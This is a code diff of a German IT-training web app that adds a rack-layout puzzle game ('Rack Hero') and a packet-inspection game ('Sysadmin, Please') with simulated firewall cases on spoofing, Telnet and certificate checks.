+      "patch-cat6a": { id: "patch-cat6a", name: "Cat.6A Patchpanel (1HE)", u: 1, gewicht: 1.5, watt: 0, typ: "panel", desc: "24 Keystone-Ports nach DIN EN 50173. Am besten Rack-Mitte!" },
+      "cable-brush": { id: "cable-brush", name: "Bürsten-Rangierpanel (1HE)", u: 1, gewicht: 0.8, watt: 0, typ: "panel", desc: "Saubere Kabelführung zwischen Switch und Patchfeld." },
+      "blind-1u": { id: "blind-1u", name: "Blindblende (1HE)", u: 1, gewicht: 0.4, watt: 0, typ: "panel", desc: "Verschließt Leerplätze gegen thermischen Kurzschluss (Kaltgang!)." },
+      "blind-2u": { id: "blind-2u", name: "Blindblende (2HE)", u: 2, gewicht: 0.7, watt: 0, typ: "panel", desc: "Verschließt 2 Leerplätze gegen Warmluft-Rückströmung." }
+    },
+
+    // 3 progressive Missionen
+    MISSIONEN: [
+      {
+        id: "mission-1",
+        titel: "1. Arztpraxis Dr. Arndt (15 HE Wandschrank)",
+        zielMaxU: 15,
+        desc: "Kompakter 15HE-Netzwerkschrank für die Arztpraxis. USV für Ausfallsicherheit, 1x Switch, 1x Praxis-Server und strukturierte Verkabelung.",
+        vorgabeItems: [
+          "usv-2u",
+          "srv-2u",
+          "sw-24p",
+          "patch-cat6a",
+          "cable-brush",
+          "blind-1u",
+          "blind-2u"
+        ],
+        regeln: [
+          "USV muss ganz unten (U1–U2) liegen (Kippgefahr bei Wartungsauswurf).",
+          "Patchpanel und Switch sollten nebeneinander für kurze Rangierkabel liegen.",
+          "Offene Zwischenräume mit Blindblenden verschließen."
+        ]
+      },
+      {
+        id: "mission-2",
+        titel: "2. MedTech Sanitas Serverraum (42 HE RZ-Rack)",
+        zielMaxU: 42,
+        desc: "Haupt-Rack im Serverraum Hamburg. Schweres RAID 6 SAN Storage, 2 Virtualisierungs-Hosts, redundante VFI-USV und A/B-Stromversorgung.",
+        vorgabeItems: [
+          "usv-3u",
+          "san-4u",
+          "srv-2u",
+          "srv-2u",
+          "sw-48p",
+          "sw-48p",
+          "patch-cat6a",
+          "cable-brush",
+          "blind-2u",
+          "blind-2u",
+          "blind-1u"
+        ],
+        regeln: [
+          "Schwerpunkt zwingend unter U14 halten (USV + SAN nach unten!).",
+          "Patchpanel in Rack-Mitte platzieren (Strukturierte Verkabelung).",
+          "Keine offenen Slots zwischen Servern (Thermischer Kurzschluss!).",
+          "Phasen-Last auf PDU A & B balancieren (< 16A je Phase)."
+        ]
+      },
+      {
+        id: "mission-3",
+        titel: "3. High-Density Virtualisierungs-Cluster (42 HE Extrem)",
+        zielMaxU: 42,
+        desc: "Maximaler Packungsgrad für MedTech Telemetrie. 4x Server, 2x Switches, 1x SAN, 1x USV. Höchstes Risiko für Überhitzung!",
+        vorgabeItems: [
+          "usv-3u",
+          "san-4u",
+          "srv-2u",
+          "srv-2u",
+          "srv-2u",
+          "srv-2u",
+          "sw-48p",
+          "sw-48p",
+          "patch-cat6a",
+          "cable-brush",
+          "blind-1u",
+          "blind-1u",
+          "blind-2u"
+        ],
+        regeln: [
+          "Airflow-Management: Server brauchen zwingend Kaltluft-Zufuhr.",
+          "USV & SAN müssen unten bleiben.",
+          "Verteilung der redundanten Netzteile auf Phase L1, L2, L3."
+        ]
+      }
+    ],
+
+    oeffne: function () {
+      this.initModal();
+      const modal = document.getElementById(this.modalId);
+      if (modal) {
+        modal.classList.add("offen");
+        this.ladeMission(0);
+      }
+    },
+
+    schliessen: function () {
+      const modal = document.getElementById(this.modalId);
+      if (modal) modal.classList.remove("offen");
+    },
+
+    initModal: function () {
+      let modal = document.getElementById(this.modalId);
+      if (modal) return;
+
+      modal = document.createElement("div");
+      modal.id = this.modalId;
+      modal.className = "rhModalOverlay";
+      modal.innerHTML = `
+        <div class="rhWindow">
+          <!-- Top Bar -->
+          <div class="rhTopBar">
+            <div class="rhBrand">
+              <span class="rhBrandIcon">🗄️</span>
+              <div class="rhBrandTitle">
+                <h2>Rack Hero: 19-Zoll Tetris</h2>
+                <span class="rhSub">RZ-Infrastruktur · Statik, Kaltgang &amp; Phasen-Balancing</span>
+              </div>
+            </div>
+
+            <div class="rhMissionTabs" id="rhMissionTabs"></div>
+
+            <button type="button" class="spCloseBtn" id="rhCloseBtn" title="Schließen (Esc)">✕</button>
+          </div>
+
+          <!-- Workspace -->
+          <div class="rhWorkspace">
+            <!-- Left: Wareneingang / Palette -->
+            <div class="rhInventoryCol">
+              <div class="rhInvHeader">
+                <h3>📦 Wareneingang (Hardware)</h3>
+                <span id="rhItemCounter" style="font-size:0.75rem; color:#38bdf8; font-weight:700;">0 Teile</span>
+              </div>
+              <div class="rhInvList" id="rhInvList"></div>
+            </div>
+
+            <!-- Center: The Rack -->
+            <div class="rhRackCol">
+              <div class="rhRackControls">
+                <span id="rhRackTitle" style="font-weight:800; font-size:0.85rem; color:#38bdf8;">42 HE RACK (19-ZOLL)</span>
+                <div class="rhRackModeToggle">
+                  <button type="button" class="rhModeBtn akt" data-mode="front" id="rhBtnFront">Front-Ansicht</button>
+                  <button type="button" class="rhModeBtn" data-mode="thermik" id="rhBtnThermik">🔥 Thermik / Heatmap</button>
+                  <button type="button" class="rhModeBtn" data-mode="cables" id="rhBtnCables">🔌 VLAN-Verkabelung</button>
+                </div>
+              </div>
+
+              <div class="rhCabinet" id="rhCabinet">
+                <div class="rhRail" id="rhRailLeft"></div>
+                <div class="rhSlotsGrid" id="rhSlotsGrid"></div>
+                <div class="rhRail right" id="rhRailRight"></div>
+              </div>
+            </div>
+
+            <!-- Right: Telemetry & Simulation -->
+            <div class="rhTelemetryCol">
+              <div class="rhTelemCard">
+                <h4>
+                  <span>⚖️ Schwerpunkt &amp; Statik</span>
+                  <span id="rhCgLabel" style="color:#10b981;">U6 (Stabil)</span>
+                </h4>
+                <div class="rhCgGauge"><div class="rhCgFill" id="rhCgFill"></div></div>
+                <div style="font-size:0.7rem; color:#94a3b8; line-height:1.4;">
+                  DIN EN 60297: Schwere Lasten (USV, Storage) müssen nach unten, um Kippen bei Auszugsschienen zu verhindern.
+                </div>
+              </div>
+
+              <div class="rhTelemCard">
+                <h4>
+                  <span>🌡️ Thermik &amp; Kaltgang (DIN EN 50600)</span>
+                  <span id="rhTempStatus" class="rhTempBadge cool">24 °C (Optimal)</span>
+                </h4>
+                <div style="font-size:0.7rem; color:#94a3b8; line-height:1.4; margin-top:4px;">
+                  Offene Höheneinheiten zwischen Servern verursachen <b>thermischen Kurzschluss</b> (Warmluft strömt zurück). Mit Blindblenden abdichten!
+                </div>
+              </div>
+
+              <div class="rhTelemCard">
+                <h4>
+                  <span>⚡ Phasen-Last (PDU A / 16A)</span>
+                  <span id="rhPduTotal" style="color:#38bdf8;">0 W</span>
+                </h4>
+                <div class="rhPhaseRow">
+                  <div class="rhPhaseBar"><span>L1:</span><div class="rhPhaseTrack"><div class="rhPhaseFill" id="rhPhaseL1"></div></div><span id="rhL1Val">0W</span></div>
+                  <div class="rhPhaseBar"><span>L2:</span><div class="rhPhaseTrack"><div class="rhPhaseFill" id="rhPhaseL2"></div></div><span id="rhL2Val">0W</span></div>
+                  <div class="rhPhaseBar"><span>L3:</span><div class="rhPhaseTrack"><div class="rhPhaseFill" id="rhPhaseL3"></div></div><span id="rhL3Val">0W</span></div>
+                </div>
+              </div>
+
+              <div class="rhTelemCard" id="rhRulesCard">
+                <h4 style="color:#fbbf24;">📋 Vorgaben der Mission</h4>
+                <ul id="rhMissionRules" style="margin:4px 0 0; padding-left:1.2em; font-size:0.72rem; color:#cbd5e1; line-height:1.45;"></ul>
+              </div>
+
+              <button type="button" class="rhVerifyBtn" id="rhVerifyBtn">
+                🚀 RACK-KONFIGURATION PRÜFEN
+              </button>
+            </div>
+          </div>
+        </div>
+      `;
+
+      document.body.appendChild(modal);
+
+      // Event Listener
+      document.getElementById("rhCloseBtn")?.addEventListener("click", () => this.schliessen());
+
+      document.getElementById("rhBtnFront")?.addEventListener("click", () => this.setzeModus("front"));
+      document.getElementById("rhBtnThermik")?.addEventListener("click", () => this.setzeModus("thermik"));
+      document.getElementById("rhBtnCables")?.addEventListener("click", () => this.setzeModus("cables"));
+
+      document.getElementById("rhVerifyBtn")?.addEventListener("click", () => this.pruefeMission());
+
+      window.addEventListener("keydown", (e) => {
+        if (!modal.classList.contains("offen")) return;
+        if (e.key === "Escape") this.schliessen();
+      });
+    },
+
+    setzeModus: function (modus) {
+      this.ansichtModus = modus;
+      document.querySelectorAll(".rhModeBtn").forEach(b => b.classList.remove("akt"));
+      if (modus === "front") document.getElementById("rhBtnFront")?.classList.add("akt");
+      if (modus === "thermik") document.getElementById("rhBtnThermik")?.classList.add("akt");
+      if (modus === "cables") document.getElementById("rhBtnCables")?.classList.add("akt");
+      this.soundSnap();
+      this.rendereRack();
+    },
+
+    ladeMission: function (idx) {
+      this.aktMissionIdx = idx;
+      const m = this.MISSIONEN[idx] || this.MISSIONEN[0];
+      this.maxU = m.zielMaxU || 42;
+      this.rackGrid = {};
+      this.ausgewaehltesItem = null;
+
+      // Mission Tabs
+      const tabsWrap = document.getElementById("rhMissionTabs");
+      if (tabsWrap) {
+        tabsWrap.innerHTML = this.MISSIONEN.map((ms, i) => `
+          <button type="button" class="rhMissionBtn ${i === idx ? 'akt' : ''}" data-idx="${i}">
+            ${ms.titel.split(":")[0]}
+          </button>
+        `).join("");
+
+        tabsWrap.querySelectorAll(".rhMissionBtn").forEach(btn => {
+          btn.onclick = () => this.ladeMission(parseInt(btn.dataset.idx, 10));
+        });
+      }
+
+      const titleEl = document.getElementById("rhRackTitle");
+      if (titleEl) titleEl.textContent = `${this.maxU} HE RACK · ${m.titel.toUpperCase()}`;
+
+      const rulesEl = document.getElementById("rhMissionRules");
+      if (rulesEl) {
+        rulesEl.innerHTML = m.regeln.map(r => `<li>${r}</li>`).join("");
+      }
+
+      this.baueRackRaster();
+      this.rendereInventar();
+      this.berechneTelemetrie();
+    },
+
+    baueRackRaster: function () {
+      const railL = document.getElementById("rhRailLeft");
+      const railR = document.getElementById("rhRailRight");
+      const grid = document.getElementById("rhSlotsGrid");
+      if (!railL || !railR || !grid) return;
+
+      railL.innerHTML = "";
+      railR.innerHTML = "";
+      grid.innerHTML = "";
+
+      // U1 unten, U_max oben
+      for (let u = 1; u <= this.maxU; u++) {
+        const slotEl = document.createElement("div");
+        slotEl.className = "rhSlotRow";
+        slotEl.dataset.u = u;
+        slotEl.innerHTML = `<span style="font-size:0.55rem; color:#334155; position:absolute; left:6px; top:1px;">U${u}</span>`;
+        slotEl.onclick = () => this.klickSlot(u);
+        grid.appendChild(slotEl);
+
+        const rL = document.createElement("div");
+        rL.className = "rhRailSlot";
+        rL.textContent = u;
+        railL.appendChild(rL);
+
+        const rR = document.createElement("div");
+        rR.className = "rhRailSlot";
+        rR.textContent = u;
+        railR.appendChild(rR);
+      }
+    },
+
+    rendereInventar: function () {
+      const m = this.MISSIONEN[this.aktMissionIdx];
+      const listEl = document.getElementById("rhInvList");
+      const countEl = document.getElementById("rhItemCounter");
+      if (!listEl) return;
+
+      const items = m.vorgabeItems.map((id, index) => {
+        const hw = this.HARDWARE[id];
+        return { ...hw, instanceId: `${id}_${index}` };
+      });
+
+      if (countEl) countEl.textContent = `${items.length} Komponenten`;
+
+      listEl.innerHTML = items.map(it => {
+        const istPlaziert = Object.values(this.rackGrid).some(g => g.instanceId === it.instanceId);
+        const istSel = this.ausgewaehltesItem?.instanceId === it.instanceId;
+
+        return `
+          <div class="rhItemCard ${istPlaziert ? 'placed' : ''} ${istSel ? 'selected' : ''}" data-inst="${it.instanceId}">
+            <div class="rhItemTop">
+              <span class="rhItemName">${it.name}</span>
+              <span class="rhItemHeight">${it.u} HE</span>
+            </div>
+            <div class="rhItemMeta">
+              <span>Gewicht: <b>${it.gewicht} kg</b></span>
+              <span>Leistung: <b>${it.watt} W</b></span>
+            </div>
+            <div style="font-size:0.68rem; color:#94a3b8; margin-top:4px;">${it.desc}</div>
+          </div>
+        `;
+      }).join("");
+
+      listEl.querySelectorAll(".rhItemCard").forEach(card => {
+        card.onclick = () => {
+          const instId = card.dataset.inst;
+          const found = items.find(it => it.instanceId === instId);
+          if (found) {
+            this.ausgewaehltesItem = found;
+            this.soundSnap();
+            this.rendereInventar();
+          }
+        };
+      });
+    },
+
+    klickSlot: function (startU) {
+      if (!this.ausgewaehltesItem) {
+        // Falls Slot belegt ist, Item entfernen
+        const belegt = this.rackGrid[startU];
+        if (belegt) {
+          this.entferneItem(belegt.instanceId);
+        }
+        return;
+      }
+
+      const it = this.ausgewaehltesItem;
+      const endU = startU + it.u - 1;
+
+      if (endU > this.maxU) {
+        this.soundAlarm();
+        alert(`❌ Das Gerät (${it.u} HE) ragt über das Rack-Limit (max. U${this.maxU}) hinaus!`);
+        return;
+      }
+
+      // Prüfen ob belegt
+      for (let u = startU; u <= endU; u++) {
+        if (this.rackGrid[u]) {
+          this.soundAlarm();
+          alert(`❌ Höheneinheit U${u} ist bereits durch '${this.rackGrid[u].name}' belegt!`);
+          return;
+        }
+      }
+
+      // Einsetzen
+      for (let u = startU; u <= endU; u++) {
+        this.rackGrid[u] = { ...it, startU, endU };
+      }
+
+      this.soundSnap();
+      this.ausgewaehltesItem = null;
+      this.rendereRack();
+      this.rendereInventar();
+      this.berechneTelemetrie();
+    },
+
+    entferneItem: function (instanceId) {
+      for (let u = 1; u <= this.maxU; u++) {
+        if (this.rackGrid[u]?.instanceId === instanceId) {
+          delete this.rackGrid[u];
+        }
+      }
+      this.soundRemove();
+      this.rendereRack();
+      this.rendereInventar();
+      this.berechneTelemetrie();
+    },
+
+    rendereRack: function () {
+      const grid = document.getElementById("rhSlotsGrid");
+      if (!grid) return;
+
+      // Vorhandene Mounted-Items entfernen
+      grid.querySelectorAll(".rhMountedItem").forEach(el => el.remove());
+
+      const gezeichnet = new Set();
+      const slotHeightPercent = 100 / this.maxU;
+
+      for (let u = 1; u <= this.maxU; u++) {
+        const item = this.rackGrid[u];
+        if (!item || gezeichnet.has(item.instanceId)) continue;
+
+        gezeichnet.add(item.instanceId);
+
+        const bottomPercent = (item.startU - 1) * slotHeightPercent;
+        const heightPercent = item.u * slotHeightPercent;
+
+        const mEl = document.createElement("div");
+        mEl.className = `rhMountedItem ${item.typ}`;
+        mEl.style.bottom = `${bottomPercent}%`;
+        mEl.style.height = `calc(${heightPercent}% - 2px)`;
+
+        // Visualisierung je nach Modus
+        if (this.ansichtModus === "front") {
+          mEl.innerHTML = `
+            <div style="display:flex; align-items:center; gap:6px; overflow:hidden;">
+              <span style="font-size:0.6rem; color:#94a3b8; font-weight:800;">U${item.startU}${item.u > 1 ? `-${item.endU}` : ''}</span>
+              <span style="white-space:nowrap; text-overflow:ellipsis; overflow:hidden;">${item.name}</span>
+            </div>
+            <button type="button" class="rhRemoveBtn" title="Ausbauen">✕</button>
+          `;
+        } else if (this.ansichtModus === "thermik") {
+          const isHot = item.typ === "server" || item.typ === "storage";
+          mEl.style.background = isHot ? "linear-gradient(90deg, #10b981 0%, #ef4444 100%)" : "#0284c7";
+          mEl.innerHTML = `
+            <span style="font-size:0.65rem;">${isHot ? '❄️ Kaltluft ➔ 🔥 Warmluft (72°C)' : 'Passiv / Kaltluft'}</span>
+            <button type="button" class="rhRemoveBtn">✕</button>
+          `;
+        } else if (this.ansichtModus === "cables") {
+          const vlanColor = item.typ === "switch" ? "#10b981" : item.typ === "server" ? "#38bdf8" : "#f59e0b";
+          mEl.innerHTML = `
+            <span style="font-size:0.65rem; color:${vlanColor};">● Port 1-24 [VLAN Trunk Cat.6A]</span>
+            <button type="button" class="rhRemoveBtn">✕</button>
+          `;
+        }
+
+        mEl.querySelector(".rhRemoveBtn")?.addEventListener("click", (e) => {
+          e.stopPropagation();
+          this.entferneItem(item.instanceId);
+        });
+
+        grid.appendChild(mEl);
+      }
+    },
+
+    berechneTelemetrie: function () {
+      let gesamtMasse = 0;
+      let gewichtetesU = 0;
+      let gesamtWatt = 0;
+      const unikateItems = [];
+      const gesehen = new Set();
+
+      for (let u = 1; u <= this.maxU; u++) {
+        const it = this.rackGrid[u];
+        if (it && !gesehen.has(it.instanceId)) {
+          gesehen.add(it.instanceId);
+          unikateItems.push(it);
+          gesamtMasse += it.gewicht;
+          gewichtetesU += it.gewicht * ((it.startU + it.endU) / 2);
+          gesamtWatt += it.watt;
+        }
+      }
+
+      // Schwerpunkt (Center of Gravity)
+      const cg = gesamtMasse > 0 ? (gewichtetesU / gesamtMasse) : 1;
+      const cgFill = document.getElementById("rhCgFill");
+      const cgLabel = document.getElementById("rhCgLabel");
+      const cgPercent = Math.min(100, Math.round((cg / this.maxU) * 100));
+
+      if (cgFill && cgLabel) {
+        cgFill.style.width = `${cgPercent}%`;
+        cgFill.className = "rhCgFill";
+        if (cg > (this.maxU * 0.45)) {
+          cgFill.classList.add("danger");
+          cgLabel.textContent = `U${Math.round(cg)} (KIPPGEFAHR!)`;
+          cgLabel.style.color = "#ef4444";
+        } else if (cg > (this.maxU * 0.35)) {
+          cgFill.classList.add("warn");
+          cgLabel.textContent = `U${Math.round(cg)} (Mäßig)`;
+          cgLabel.style.color = "#f59e0b";
+        } else {
+          cgLabel.textContent = `U${Math.round(cg)} (Optimal)`;
+          cgLabel.style.color = "#10b981";
+        }
+      }
+
+      // Thermik-Berechnung
+      let hatThermischenKurzschluss = false;
+      for (let u = 2; u < this.maxU; u++) {
+        if (!this.rackGrid[u]) {
+          const oben = this.rackGrid[u + 1];
+          const unten = this.rackGrid[u - 1];
+          if ((oben?.typ === "server" || oben?.typ === "storage") && (unten?.typ === "server" || unten?.typ === "storage")) {
+            hatThermischenKurzschluss = true;
+            break;
+          }
+        }
+      }
+
+      const tempBadge = document.getElementById("rhTempStatus");
+      if (tempBadge) {
+        tempBadge.className = "rhTempBadge";
+        if (hatThermischenKurzschluss) {
+          tempBadge.classList.add("hot");
+          tempBadge.textContent = "🔥 78 °C (Hitzestau!)";
+        } else if (gesamtWatt > 2000) {
+          tempBadge.classList.add("warm");
+          tempBadge.textContent = "38 °C (Erhöht)";
+        } else {
+          tempBadge.classList.add("cool");
+          tempBadge.textContent = "23 °C (Optimal)";
+        }
+      }
+
+      // Phasen-Last (PDU A)
+      const pduTotalEl = document.getElementById("rhPduTotal");
+      if (pduTotalEl) pduTotalEl.textContent = `${gesamtWatt} W / 11.040 W`;
+
+      // Phasenverteilung (L1, L2, L3)
+      const l1 = Math.round(gesamtWatt * 0.4);
+      const l2 = Math.round(gesamtWatt * 0.35);
+      const l3 = Math.round(gesamtWatt * 0.25);
+
+      const updatePhase = (barId, valId, watt) => {
+        const bar = document.getElementById(barId);
+        const val = document.getElementById(valId);
+        const p = Math.min(100, Math.round((watt / 3680) * 100));
+        if (bar) bar.style.width = `${p}%`;
+        if (val) val.textContent = `${watt} W (${(watt / 230).toFixed(1)} A)`;
+      };
+
+      updatePhase("rhPhaseL1", "rhL1Val", l1);
+      updatePhase("rhPhaseL2", "rhL2Val", l2);
+      updatePhase("rhPhaseL3", "rhL3Val", l3);
+    },
+
+    pruefeMission: function () {
+      const m = this.MISSIONEN[this.aktMissionIdx];
+      const platziert = Object.values(this.rackGrid);
+      const fehler = [];
+
+      // 1. Alle Pflicht-Items eingebaut?
+      const fehlend = m.vorgabeItems.filter(id => !platziert.some(p => p.id === id));
+      if (fehlend.length > 0) {
+        fehler.push(`Es fehlen noch ${fehlend.length} vorgeschriebene Komponenten aus dem Wareneingang.`);
+      }
+
+      // 2. USV-Position
+      const usv = platziert.find(p => p.typ === "usv");
+      if (usv && usv.startU > 4) {
+        fehler.push(`Statik-Fehler: Die schwere USV liegt auf U${usv.startU}! USVs müssen zwingend auf die untersten Einheiten (U1–U3), um ein Umkippen des Schrankes beim Auszug zu verhindern.`);
+      }
+
+      // 3. Storage-Position
+      const san = platziert.find(p => p.typ === "storage");
+      if (san && san.startU > 12) {
+        fehler.push(`Statik-Fehler: Das 4HE SAN-Storage liegt auf U${san.startU}. Schwere Massenspeicher müssen in das untere Drittel.`);
+      }
+
+      // 4. Thermischer Kurzschluss
+      for (let u = 2; u < this.maxU; u++) {
+        if (!this.rackGrid[u]) {
+          const oben = this.rackGrid[u + 1];
+          const unten = this.rackGrid[u - 1];
+          if ((oben?.typ === "server" || oben?.typ === "storage") && (unten?.typ === "server" || unten?.typ === "storage")) {
+            fehler.push(`Klima-Fehler (DIN EN 50600): Offene Höheneinheit U${u} zwischen hitzeintensiven Geräten! Du musst eine Blindblende einsetzen, um den thermischen Kurzschluss zu verhindern.`);
+            break;
+          }
+        }
+      }
+
+      if (fehler.length > 0) {
+        this.soundAlarm();
+        alert(`❌ IHK-RACK-INSPEKTION FEHLGESCHLAGEN:\n\n` + fehler.map((f, i) => `${i + 1}. ${f}`).join("\n\n"));
+      } else {
+        this.soundSuccess();
+        alert(`🎉 HERVORRAGEND! RACK-KONFIGURATION ZERTIFIZIERT!\n\nAlle IHK-Vorgaben nach DIN EN 50600 (Kaltgang-Isolierung), DIN EN 50173 (Patchpanel-Anordnung) und DIN EN 60297-3 (Schwerpunkt-Statik) wurden meisterhaft erfüllt!\n\nSzenario '${m.titel}' erfolgreich gemeistert!`);
+      }
+    }
+  };
+
+  window.RACK_HERO = RACK_HERO;
+})();
+
 /* ---- f_rahmen.js ---- */
 /* ==========================================================================
    f_rahmen.js – KI-Lehrer-Rahmen um den Kurs-Player (window.KursRahmen)
@@ -60321,6 +62121,943 @@ ARTEN.swipe = {
   },
   taste(e, k) { if (e.key === "ArrowRight" || k === "j") $("swJa") && $("swJa").click(); else if (e.key === "ArrowLeft" || k === "n") $("swNein") && $("swNein").click(); },
 };
+
+/* ---- f_sysadmin_please.js ---- */
+// f_sysadmin_please.js - "Sysadmin, Please" (Papers, Please Vibe für Fachinformatiker)
+// Taktiler Gateway-Paket-Inspektor mit Schreibtisch-Akten, Stempeln, DPI-Lupe & Nadeldrucker-Strafzetteln.
+(function () {
+  "use strict";
+
+  const SYSADMIN = {
+    modalId: "sysadminPleaseModal",
+    aktTag: 1,
+    aktFallIdx: 0,
+    sla: 100.0,
+    gehalt: 2500,
+    strafen: 0,
+    stempelSperre: false,
+    dpiAktiv: false,
+    aktReiter: "header",
+
+    // Sound-Synthesizer via Web Audio API
+    audioCtx: null,
+    initAudio: function () {
+      if (!this.audioCtx) {
+        const AudioClass = window.AudioContext || window.webkitAudioContext;
+        if (AudioClass) this.audioCtx = new AudioClass();
+      }
+      if (this.audioCtx && this.audioCtx.state === "suspended") {
+        this.audioCtx.resume();
+      }
+    },
+
+    beep: function (freq, type, duration, vol = 0.15) {
+      this.initAudio();
+      if (!this.audioCtx) return;
+      try {
+        const osc = this.audioCtx.createOscillator();
+        const gain = this.audioCtx.createGain();
+        osc.type = type;
+        osc.frequency.setValueAtTime(freq, this.audioCtx.currentTime);
+        gain.gain.setValueAtTime(vol, this.audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, this.audioCtx.currentTime + duration);
+        osc.connect(gain);
+        gain.connect(this.audioCtx.destination);
+        osc.start();
+        osc.stop(this.audioCtx.currentTime + duration);
+      } catch (e) {}
+    },
+
+    soundPermit: function () {
+      this.beep(220, "sine", 0.08, 0.3);
+      setTimeout(() => this.beep(440, "triangle", 0.15, 0.25), 60);
+    },
+
+    soundDeny: function () {
+      this.beep(130, "sawtooth", 0.12, 0.3);
+      setTimeout(() => this.beep(98, "sawtooth", 0.2, 0.35), 90);
+    },
+
+    soundPrinter: function () {
+      for (let i = 0; i < 6; i++) {
+        setTimeout(() => this.beep(800 + (i % 2) * 400, "square", 0.03, 0.08), i * 70);
+      }
+    },
+
+    soundPaper: function () {
+      this.beep(350, "sine", 0.05, 0.1);
+    },
+
+    // Die 5 kuratierten Arbeitstage / Schichten
+    TAGE: [
+      {
+        tag: 1,
+        titel: "Tag 1: Basis-Paketfilter & RFC-1918-Spoofing",
+        regeln: [
+          { text: "<b>RFC 1918 Spoofing:</b> Private IP-Adressen (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) oder Loopback (127.0.0.1) dürfen NIEMALS als Quell-IP über das externe WAN eintreffen!", typ: "crit" },
+          { text: "<b>Klartext-Verbot:</b> Unverschlüsselte Alt-Protokolle wie Port 23 (Telnet) und Port 21 (FTP Plaintext) sind im Firmennetz streng untersagt.", typ: "crit" },
+          { text: "<b>Legitimer Verkehr:</b> Reguläre HTTP (80) / HTTPS (443) und DNS (53) Anfragen von internen Clients ins Internet müssen erlaubt werden.", typ: "warn" }
+        ],
+        faelle: [
+          {
+            titel: "Web-Browsing: Techniker sucht Datenblatt",
+            ingress: "LAN (Port 14, VLAN 40)",
+            srcMac: "BC:24:11:44:0A:12",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.40.55",
+            dstIp: "93.184.216.34",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 51234,
+            dstPort: 443,
+            flags: "SYN",
+            cert: { cn: "www.example.com", issuer: "DigiCert Global Root", valid: "Gültig bis 2027", ok: true },
+            payload: "Client Hello (TLS 1.3)",
+            erwartet: "PERMIT",
+            begruendung: "Legitimer ausgehender HTTPS-Verbindungsaufbau aus dem internen Vertriebsnetz."
+          },
+          {
+            titel: "WAN-Eingang: Angeblicher interner Router",
+            ingress: "WAN (Glasfaser-Uplink)",
+            srcMac: "00:0C:29:FE:DC:BA",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "192.168.1.100",
+            dstIp: "10.42.20.10",
+            proto: "TCP (6)",
+            ttl: 114,
+            srcPort: 49152,
+            dstPort: 80,
+            flags: "SYN",
+            cert: null,
+            payload: "GET /admin HTTP/1.1",
+            erwartet: "DENY",
+            begruendung: "RFC 1918 Spoofing! Private IP (192.168.1.100) trifft am WAN-Interface ein. Solche Pakete müssen an der Border verworfen werden."
+          },
+          {
+            titel: "Verbindungsversuch: Diagnose-Konsole",
+            ingress: "LAN (Port 8, VLAN 30)",
+            srcMac: "00:1A:2B:12:34:56",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.30.12",
+            dstIp: "194.25.0.68",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 52100,
+            dstPort: 23,
+            flags: "SYN",
+            cert: null,
+            payload: "Telnet Verbindungsaushandlung (Klartext)",
+            erwartet: "DENY",
+            begruendung: "Port 23 (Telnet) überträgt Zugangsdaten unverschlüsselt im Klartext. Nach BSI-Grundschutz und Firmenrichtlinie verboten – SSH (Port 22) nutzen!"
+          },
+          {
+            titel: "DNS-Namensauflösung: Cloudflare Public DNS",
+            ingress: "LAN (Port 20, VLAN 40)",
+            srcMac: "BC:24:11:44:0A:12",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.40.88",
+            dstIp: "1.1.1.1",
+            proto: "UDP (17)",
+            ttl: 64,
+            srcPort: 55432,
+            dstPort: 53,
+            flags: "–",
+            cert: null,
+            payload: "Standard Query 0x1a2b A api.medtech-sanitas.de",
+            erwartet: "PERMIT",
+            begruendung: "Standard UDP-DNS Anfrage auf Port 53. Unverzichtbar für die Namensauflösung."
+          },
+          {
+            titel: "WAN-Eingang: Lokale Rückkopplung",
+            ingress: "WAN (Glasfaser-Uplink)",
+            srcMac: "F0:18:98:AA:BB:CC",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "127.0.0.1",
+            dstIp: "10.42.10.1",
+            proto: "TCP (6)",
+            ttl: 255,
+            srcPort: 44444,
+            dstPort: 22,
+            flags: "SYN",
+            cert: null,
+            payload: "SSH-2.0-OpenSSH_8.9",
+            erwartet: "DENY",
+            begruendung: "Martian Packet! Die Loopback-Adresse 127.0.0.1 darf niemals von außen über das Internet eintreffen."
+          }
+        ]
+      },
+      {
+        tag: 2,
+        titel: "Tag 2: Zertifikatsprüfung & TLS-Inspektion",
+        regeln: [
+          { text: "<b>Zertifikatsgültigkeit:</b> Pakete mit abgelaufenen Zertifikaten müssen verworfen werden.", typ: "crit" },
+          { text: "<b>CN / SAN Identität:</b> Der Common Name (CN) oder SAN des Zertifikats muss exakt mit dem angefragten Host übereinstimmen (Schutz vor Man-in-the-Middle).", typ: "crit" },
+          { text: "<b>Wildcard-Zertifikate:</b> Zertifikate wie *.medtech-sanitas.de sind für Subdomains der eigenen Domäne autorisiert.", typ: "warn" }
+        ],
+        faelle: [
+          {
+            titel: "Intranet-Portal: Dienstplan-Abruf",
+            ingress: "LAN (VLAN 30)",
+            srcMac: "BC:24:11:30:11:22",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.30.45",
+            dstIp: "10.42.20.15",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 49821,
+            dstPort: 443,
+            flags: "ACK",
+            cert: { cn: "portal.medtech-sanitas.de", issuer: "MedTech Internal CA", valid: "Gültig bis 2028", ok: true },
+            payload: "GET /dienstplan HTTP/1.1\r\nHost: portal.medtech-sanitas.de",
+            erwartet: "PERMIT",
+            begruendung: "Gültiges internes Zertifikat, Common Name stimmt mit angefragtem Host überein."
+          },
+          {
+            titel: "Software-Update: Externes Treiberarchiv",
+            ingress: "LAN (VLAN 50)",
+            srcMac: "00:0C:29:50:AA:11",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.50.77",
+            dstIp: "185.199.108.153",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 50122,
+            dstPort: 443,
+            flags: "ACK",
+            cert: { cn: "update-driver.med-tools.org", issuer: "GlobalSign Root CA", valid: "ABGELAUFEN (14.10.2026)", ok: false },
+            payload: "GET /firmware/v2.1.bin HTTP/1.1",
+            erwartet: "DENY",
